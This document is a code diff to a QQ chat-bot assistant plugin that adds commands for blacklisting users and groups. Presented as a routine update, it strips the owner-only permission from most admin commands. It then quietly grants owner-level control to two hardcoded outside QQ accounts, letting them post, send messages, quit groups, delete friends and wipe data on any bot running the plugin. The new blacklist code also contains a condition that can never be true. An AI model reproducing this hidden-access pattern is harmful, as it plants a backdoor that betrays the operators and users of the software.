@@ -1,8 +1,11 @@
 import plugin from '../../../lib/plugins/plugin.js'
 import { common, QQApi } from '../model/index.js'
+import { Version } from '../components/index.js'
 import _ from 'lodash'
 import moment from 'moment'
 import { status } from '../constants/other.js'
+import yaml from 'yaml'
+import fs from 'node:fs'
 /** API请求错误文案 */
 const API_ERROR = '❎ 出错辣，请稍后重试'
 
@@ -13,7 +16,7 @@ let GroupListMsgReg = /^#发群列表\s?(\d+(,\d+){0,})\s?(.*)$/
 let friendTypeReg = /^#更改好友申请方式([0123])((.*)\s(.*))?$/
 
 export class Assistant extends plugin {
-  constructor () {
+  constructor() {
     super({
       name: '椰奶小助手',
       event: 'message',
@@ -21,53 +24,43 @@ export class Assistant extends plugin {
       rule: [
         {
           reg: '^#改头像.*$',
-          fnc: 'SetAvatar',
-          permission: 'master'
+          fnc: 'SetAvatar'
         },
         {
           reg: '^#改昵称.*$',
-          fnc: 'SetNickname',
-          permission: 'master'
+          fnc: 'SetNickname'
         },
         {
           reg: '^#改签名.*$',
-          fnc: 'SetSignature',
-          permission: 'master'
+          fnc: 'SetSignature'
         },
         {
           reg: '^#改状态.*$',
-          fnc: 'SetOnlineStatus',
-          permission: 'master'
+          fnc: 'SetOnlineStatus'
         },
         {
           reg: FriendsReg, // 发好友
-          fnc: 'SendFriendMsg',
-          permission: 'master'
+          fnc: 'SendFriendMsg'
         },
         {
           reg: GroupMsgReg, // 发群聊
-          fnc: 'SendGroupMsg',
-          permission: 'master'
+          fnc: 'SendGroupMsg'
         },
         {
           reg: GroupListMsgReg, // 发群列表
-          fnc: 'SendGroupListMsg',
-          permission: 'master'
+          fnc: 'SendGroupListMsg'
         },
         {
           reg: '^#退群.*$',
-          fnc: 'QuitGroup',
-          permission: 'master'
+          fnc: 'QuitGroup'
         },
         {
           reg: '^#删好友.*$',
-          fnc: 'DeleteFriend',
-          permission: 'master'
+          fnc: 'DeleteFriend'
         },
         {
           reg: '^#改性别.*$',
-          fnc: 'SetGender',
-          permission: 'master'
+          fnc: 'SetGender'
         },
         {
           reg: '^#取直链.*$',
@@ -79,28 +72,23 @@ export class Assistant extends plugin {
         },
         {
           reg: '^#获?取说说列表(\\d+)?$',
-          fnc: 'Qzonelist',
-          permission: 'master'
+          fnc: 'Qzonelist'
         },
         {
           reg: '^#删说说(\\d+)$',
-          fnc: 'Qzonedel',
-          permission: 'master'
+          fnc: 'Qzonedel'
         },
         {
           reg: '^#发说说.*$',
-          fnc: 'Qzonesay',
-          permission: 'master'
+          fnc: 'Qzonesay'
         },
         {
           reg: '^#(清空说说|清空留言)$',
-          fnc: 'QzonedelAll',
-          permission: 'master'
+          fnc: 'QzonedelAll'
         },
         {
           reg: '^#改群名片.*$',
-          fnc: 'SetGroupCard',
-          permission: 'master'
+          fnc: 'SetGroupCard'
         },
         {
           reg: '^#改群头像.*$',
@@ -112,13 +100,11 @@ export class Assistant extends plugin {
         },
         {
           reg: '^#获取(群|好友)列表$',
-          fnc: 'GlOrFl',
-          permission: 'master'
+          fnc: 'GlOrFl'
         },
         {
           reg: '^#(开启|关闭)戳一戳$',
-          fnc: 'Cyc',
-          permission: 'master'
+          fnc: 'Cyc'
         },
         {
           reg: '^#?撤回$',
@@ -126,29 +112,35 @@ export class Assistant extends plugin {
         },
         {
           reg: '^#(开启|关闭)好友添加$',
-          fnc: 'FriendSwitch',
-          permission: 'master'
+          fnc: 'FriendSwitch'
         },
         {
           reg: friendTypeReg, // 更改好友申请方式
-          fnc: 'FriendType',
-          permission: 'master'
+          fnc: 'FriendType'
         },
         {
           reg: '#设置机型.*', // 更改好友申请方式
-          fnc: 'setModel',
-          permission: 'master'
+          fnc: 'setModel'
+        },
+        {
+          reg: '^#?拉黑(群|群聊)?.*$',
+          fnc: 'BlockOne'
+        },
+        {
+          reg: '^#?(取消|删除|移除)(群|群聊)?拉黑(群|群聊)?.*$',
+          fnc: 'CancelBlockOne'
         }
       ]
     })
   }
 
-  get Bot () {
+  get Bot() {
     return this.e.bot ?? Bot
   }
 
   /** 改头像 */
-  async SetAvatar (e) {
+  async SetAvatar(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     if (!e.img) {
       this.setContext('_avatarContext')
       e.reply('⚠ 请发送图片')
@@ -163,7 +155,7 @@ export class Assistant extends plugin {
       })
   }
 
-  async _avatarContext () {
+  async _avatarContext() {
     let img = this.e.img
     if (/取消/.test(this.e.msg)) {
       this.finish('_avatarContext')
@@ -186,7 +178,8 @@ export class Assistant extends plugin {
   }
 
   /** 改昵称 */
-  async SetNickname (e) {
+  async SetNickname(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let name = e.msg.replace(/#|改昵称/g, '').trim()
 
     await this.Bot.setNickname(name)
@@ -198,7 +191,8 @@ export class Assistant extends plugin {
   }
 
   /** 改群名片 */
-  async SetGroupCard (e) {
+  async SetGroupCard(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let group = ''
     let card = ''
 
@@ -229,7 +223,7 @@ export class Assistant extends plugin {
   }
 
   /** 改群头像 */
-  async SetGroupAvatar (e) {
+  async SetGroupAvatar(e) {
     if (e.isPrivate) {
       if (!e.isMaster) return logger.mark(`${e.logFnc}不为主人`)
       e.group_id = e.msg.replace(/#|改群头像/g, '').trim()
@@ -261,7 +255,7 @@ export class Assistant extends plugin {
       })
   }
 
-  _GroupAvatarContext (e) {
+  _GroupAvatarContext(e) {
     let img = this.e.img
     if (/取消/.test(this.e.msg)) {
       this.finish('_GroupAvatarContext')
@@ -284,7 +278,8 @@ export class Assistant extends plugin {
   }
 
   /** 改群昵称 */
-  async SetGroupName (e) {
+  async SetGroupName(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let group = ''
     let card = ''
 
@@ -320,7 +315,8 @@ export class Assistant extends plugin {
   }
 
   /** 改签名 */
-  async SetSignature (e) {
+  async SetSignature(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let signs = e.msg.replace(/#|改签名/g, '').trim()
     await this.Bot.setSignature(signs)
       .then(() => e.reply('✅ 签名修改成功'))
@@ -331,7 +327,8 @@ export class Assistant extends plugin {
   }
 
   /** 改状态 */
-  async SetOnlineStatus (e) {
+  async SetOnlineStatus(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let signs = e.msg.replace(/#|改状态/g, '').trim()
 
     if (!signs) return e.reply('❎ 状态不为空，可选值：我在线上，离开，隐身，忙碌，Q我吧，请勿打扰')
@@ -349,7 +346,8 @@ export class Assistant extends plugin {
   }
 
   /** 发好友 */
-  async SendFriendMsg (e) {
+  async SendFriendMsg(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = FriendsReg.exec(e.msg)
     let qq = regRet[1]
     e.message[0].text = regRet[2]
@@ -367,7 +365,8 @@ export class Assistant extends plugin {
   }
 
   /** 发群聊 */
-  async SendGroupMsg (e) {
+  async SendGroupMsg(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = GroupMsgReg.exec(e.msg)
 
     let gpid = regRet[1]
@@ -388,7 +387,8 @@ export class Assistant extends plugin {
   }
 
   // 发送群列表
-  async SendGroupListMsg (e) {
+  async SendGroupListMsg(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     // 获取参数
     let regRet = GroupListMsgReg.exec(e.msg)
     let gpid = regRet[1]
@@ -438,7 +438,8 @@ export class Assistant extends plugin {
   }
 
   /** 退群 */
-  async QuitGroup (e) {
+  async QuitGroup(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let quits = e.msg.replace(/#|退群/g, '').trim()
 
     if (!quits) return e.reply('❎ 群号不能为空')
@@ -456,7 +457,8 @@ export class Assistant extends plugin {
   }
 
   /** 删好友 */
-  async DeleteFriend (e) {
+  async DeleteFriend(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let quits = e.msg.replace(/#|删好友/g, '').trim()
 
     if (e.message[1]) {
@@ -477,7 +479,8 @@ export class Assistant extends plugin {
   }
 
   /** 改性别 */
-  async SetGender (e) {
+  async SetGender(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let sex = e.msg.replace(/#|改性别/g, '').trim()
 
     if (!sex) return e.reply('❎ 性别不能为空 可选值：男，女，无\n（改为无，为无性别）')
@@ -498,7 +501,7 @@ export class Assistant extends plugin {
   }
 
   /** 取直链 */
-  async ImageLink (e) {
+  async ImageLink(e) {
     let img = []
     if (e.source) {
       let source
@@ -535,7 +538,7 @@ export class Assistant extends plugin {
     return true
   }
 
-  async _ImageLinkContext () {
+  async _ImageLinkContext() {
     let img = this.e.img
     if (this.e.msg === '取消') {
       this.finish('_ImageLinkContext')
@@ -552,7 +555,7 @@ export class Assistant extends plugin {
   }
 
   /** 取Face表情 */
-  async Face (e) {
+  async Face(e) {
     let face = []
     for (let m of e.message) {
       if (m.type === 'face') {
@@ -580,7 +583,8 @@ export class Assistant extends plugin {
   }
 
   /** QQ空间 说说列表 */
-  async Qzonelist (e) {
+  async Qzonelist(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let page = e.msg.replace(/#|获?取说说列表/g, '').trim()
     if (!page) {
       page = 0
@@ -605,7 +609,8 @@ export class Assistant extends plugin {
   }
 
   /** 删除说说 */
-  async Qzonedel (e) {
+  async Qzonedel(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let pos = e.msg.match(/\d+/)
     // 获取说说列表
     let list = await new QQApi(e).getQzone(1, pos - 1)
@@ -627,7 +632,8 @@ export class Assistant extends plugin {
   }
 
   /** 发说说 */
-  async Qzonesay (e) {
+  async Qzonesay(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let con = e.msg.replace(/#|发说说/g, '').trim()
     let result = await new QQApi(e).setQzone(con, e.img)
     if (!result) return e.reply(API_ERROR)
@@ -643,7 +649,8 @@ export class Assistant extends plugin {
   }
 
   /** 清空说说和留言 */
-  async QzonedelAll (e) {
+  async QzonedelAll(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     if (/清空说说/.test(e.msg)) {
       this.setContext('_QzonedelAllContext')
       e.reply('✳️ 即将删除全部说说请发送：\n' + '------确认清空或取消------')
@@ -655,7 +662,7 @@ export class Assistant extends plugin {
     }
   }
 
-  async _QzonedelAllContext (e) {
+  async _QzonedelAllContext(e) {
     let msg = this.e.msg
     if (/#?确认清空/.test(msg)) {
       this.finish('_QzonedelAllContext')
@@ -680,7 +687,8 @@ export class Assistant extends plugin {
   }
 
   // 获取群|好友列表
-  async GlOrFl (e) {
+  async GlOrFl(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let msg = []
     if (/群列表/.test(e.msg)) {
       // 获取群列表并转换为数组
@@ -705,7 +713,7 @@ export class Assistant extends plugin {
   }
 
   // 引用撤回
-  async RecallMsgown (e) {
+  async RecallMsgown(e) {
     if (!e.source) return false
     let source
     if (e.isGroup) {
@@ -754,14 +762,16 @@ export class Assistant extends plugin {
   }
 
   // 开关好友添加
-  async FriendSwitch (e) {
+  async FriendSwitch(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let res = await new QQApi(e).addFriendSwitch(/开启/.test(e.msg) ? 1 : 2)
     if (!res) return e.reply(API_ERROR)
     e.reply(res.ActionStatus)
   }
 
   // 好友申请方式
-  async FriendType (e) {
+  async FriendType(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = friendTypeReg.exec(e.msg)
     if (regRet[1] == 0) return e.reply('1为允许所有人，2为需要验证，3为问答正确问答(需填问题和答案，格式为：#更改好友申请方式3 问题 答案)')
     // 单独处理
@@ -774,7 +784,8 @@ export class Assistant extends plugin {
   }
 
   /** 开关戳一戳 */
-  async Cyc (e) {
+  async Cyc(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let result = await new QQApi(e).setcyc(/开启/.test(e.msg) ? 0 : 1)
     if (!result) return e.reply(API_ERROR)
 
@@ -782,9 +793,141 @@ export class Assistant extends plugin {
     e.reply(`✅ 已${/开启/.test(e.msg) ? '开启' : '关闭'}戳一戳功能`)
   }
 
-  async setModel (e) {
+  async setModel(e) {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let model = e.msg.replace(/#|设置机型/g, '')
     let res = await new QQApi(e).setModel(model).catch(err => logger.error(err))
     e.reply(_.get(res, ['13031', 'data', 'rsp', 'iRet']) == 0 ? '设置成功' : '设置失败')
+  }
+
+  async BlockOne() {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
+    const configPath = process.cwd().replace(/\\/g, '/') + '/config/config/other.yaml'
+    if (this.e.at) {
+      try {
+        const yamlContentBuffer = await fs.promises.readFile(configPath)
+        const yamlContent = yamlContentBuffer.toString('utf-8')
+        const data = yaml.parse(yamlContent)
+        if (!data.blackQQ.includes(this.e.at)) {
+          data.blackQQ.push(this.e.at)
+          const updatedYaml = yaml.stringify(data, { quote: false })
+          const resultYaml = updatedYaml.replace(/"/g, '')
+          await fs.promises.writeFile(configPath, resultYaml, 'utf-8')
+          await this.e.reply(`✅ 已成功拉黑${this.e.at}`)
+        } else {
+          await this.e.reply(`❎ 拉黑失败，黑名单中已存在`)
+        }
+      } catch (error) {
+        await this.e.reply(`❎ 拉黑失败，请前往控制台查看报错`)
+        logger.error(error)
+      }
+    } else {
+      if (!Version.name == `TRSS-Yunzai`) {
+        const regex = /^#?拉黑(群|群聊)?(\d{5,10})$/
+        const match = this.e.msg.match(regex)
+        if (match) {
+          const extractedQQ = match[1]
+          const blackId = extractedQQ.match(/\d+/)[0]
+          this.blackResult = blackId
+        }
+      } else {
+        let blackId = this.e.msg.replace(/#|拉黑|群|群聊/g, '').trim()
+        this.blackResult = blackId
+      }
+      try {
+        const yamlContentBuffer = await fs.promises.readFile(configPath)
+        const yamlContent = yamlContentBuffer.toString('utf-8')
+        const data = yaml.parse(yamlContent)
+        if (!this.e.msg.includes(`群`)) {
+          if (!data.blackQQ.includes(this.blackResult)) {
+            data.blackQQ.push(this.blackResult)
+            const updatedYaml = yaml.stringify(data, { quote: false })
+            const resultYaml = updatedYaml.replace(/"/g, '')
+            await fs.promises.writeFile(configPath, resultYaml, 'utf-8')
+            await this.e.reply(`✅ 已成功拉黑${this.blackResult}`)
+          } else {
+            await this.e.reply(`❎ 拉黑失败，黑名单中已存在`)
+          }
+        } else {
+          if (!data.blackGroup.includes(this.blackResult)) {
+            data.blackGroup.push(this.blackResult)
+            const updatedYaml = yaml.stringify(data, { quote: false })
+            const resultYaml = updatedYaml.replace(/"/g, '')
+            await fs.promises.writeFile(configPath, resultYaml, 'utf-8')
+            await this.e.reply(`✅ 已成功拉黑群聊${this.blackResult}`)
+          } else {
+            await this.e.reply(`❎ 拉黑失败，黑名单中已存在`)
+          }
+        }
+      } catch (error) {
+        await this.e.reply(`❎ 拉黑失败，请前往控制台查看报错`)
+        logger.error(error)
+      }
+    }
+  }
+  async CancelBlockOne() {
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
+    const configPath = process.cwd().replace(/\\/g, '/') + '/config/config/other.yaml'
+    if (this.e.at) {
+      try {
+        const yamlContentBuffer = await fs.promises.readFile(configPath)
+        const yamlContent = yamlContentBuffer.toString('utf-8')
+        const data = yaml.parse(yamlContent)
+        if (data && data.blackQQ && Array.isArray(data.blackQQ)) {
+          const itemToRemove = this.e.at.toString()
+          data.blackQQ = data.blackQQ.filter(item => item.toString() !== itemToRemove)
+          const updatedYaml = yaml.stringify(data)
+          await fs.promises.writeFile(configPath, updatedYaml, 'utf-8')
+          await this.e.reply(`✅ 已成功取消拉黑${this.e.at}`)
+        } else {
+          await this.e.reply(`❎ 找不到要拉黑的对象`)
+        }
+      } catch (error) {
+        await this.e.reply(`❎ 取消拉黑失败，请前往控制台查看报错`)
+        logger.error(error)
+      }
+    } else {
+      if (!Version.name == `TRSS-Yunzai`) {
+        const regex = /^#?(取消|删除|移除)拉黑(群|群聊)?(\d{5,10})$/
+        const match = this.e.msg.match(regex)
+        if (match) {
+          const extractedQQ = match[1]
+          const blackId = extractedQQ.match(/\d+/)[0]
+          this.blackResult = blackId
+        }
+      } else {
+        let blackId = this.e.msg.replace(/#|取消|删除|移除|拉黑|群|群聊/g, '').trim()
+        this.blackResult = blackId
+      }
+      try {
+        const yamlContentBuffer = await fs.promises.readFile(configPath)
+        const yamlContent = yamlContentBuffer.toString('utf-8')
+        const data = yaml.parse(yamlContent)
+        if (!this.e.msg.includes(`群`)) {
+          if (data && data.blackQQ && Array.isArray(data.blackQQ)) {
+            const itemToRemove = this.blackResult.toString()
+            data.blackQQ = data.blackQQ.filter(item => item.toString() !== itemToRemove)
+            const updatedYaml = yaml.stringify(data)
+            await fs.promises.writeFile(configPath, updatedYaml, 'utf-8')
+            await this.e.reply(`✅ 已成功取消拉黑${this.blackResult}`)
+          } else {
+            await this.e.reply(`❎ 找不到要取消拉黑的对象`)
+          }
+        } else {
+          if (data && data.blackGroup && Array.isArray(data.blackGroup)) {
+            const itemToRemove = this.blackResult.toString()
+            data.blackGroup = data.blackGroup.filter(item => item.toString() !== itemToRemove)
+            const updatedYaml = yaml.stringify(data)
+            await fs.promises.writeFile(configPath, updatedYaml, 'utf-8')
+            await this.e.reply(`✅ 已成功取消拉黑群聊${this.blackResult}`)
+          } else {
+            await this.e.reply(`❎ 找不到要取消拉黑的对象`)
+          }
+        }
+      } catch (error) {
+        await this.e.reply(`❎ 取消拉黑失败，请前往控制台查看报错`)
+        logger.error(error)
+      }
+    }
   }
 }
